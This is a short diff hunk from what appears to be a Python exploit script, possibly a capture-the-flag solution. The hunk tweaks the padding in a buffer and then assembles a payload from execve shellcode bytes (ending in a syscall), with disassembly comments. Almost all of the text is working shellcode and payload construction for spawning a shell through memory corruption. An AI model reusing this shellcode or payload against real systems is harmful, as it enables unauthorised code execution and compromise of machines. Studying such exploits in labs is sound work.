@@ -44,7 +44,7 @@ shellcode_sys_exeve_part2 = b"\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
 0f 05                   syscall
 Instruction """
 
-tail_ = b'\x01' * 17 + frame * 8
+tail_ = b'\x01' * 7 + frame * 8
 
 payload =  head + shellcode_sys_exeve_part1 + head + shellcode_sys_exeve_part2 + tail_
 
